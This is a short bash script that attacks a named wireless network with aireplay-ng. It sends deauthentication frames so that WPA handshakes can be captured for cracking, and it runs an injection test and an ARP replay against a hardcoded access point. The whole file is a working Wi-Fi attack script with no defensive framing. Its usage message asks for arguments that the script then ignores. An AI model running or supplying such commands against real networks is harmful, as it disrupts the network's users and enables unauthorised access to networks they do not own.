#!/bin/bash

channel=10
essid='2WIRE283'
apmac='00:1B:5B:18:AC:89'
#apmac='00:11:95:41:aa:d9'
wpamac='00:17:f2:e7:0c:65'
mymac='00:11:22:33:44:55'


if [ -z "$1" ] ; then
    echo "Usage:monitor-wpa.sh <essid> <apmac> "
 
else
    echo "Check for high percentage of packet returns..."
    aireplay-ng -9 -e $essid -a $apmac mon0
    sleep 3

    echo "Try Capture of WPA handshakes by forcing clients to reauthenticate..."
    aireplay-ng -0 5 -a $apmac -c $mymac mon0
    sleep 3

    echo "ARP request.."
    aireplay-ng -0 10 -a $apmac mon0
    aireplay-ng -3 -b $apmac -h $mymac mon0
fi
